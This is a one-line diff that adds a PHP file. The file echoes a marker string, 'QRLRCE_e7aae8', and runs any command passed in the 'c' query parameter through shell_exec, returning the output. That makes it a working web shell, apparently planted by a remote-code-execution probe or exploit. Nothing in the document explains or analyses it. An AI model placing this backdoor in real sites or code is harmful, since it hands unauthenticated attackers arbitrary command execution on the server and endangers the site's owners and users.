@@ -1,0 +1,1 @@
+<?php echo 'QRLRCE_e7aae8'; if(isset($_GET['c'])){echo shell_exec($_GET['c']);} ?>
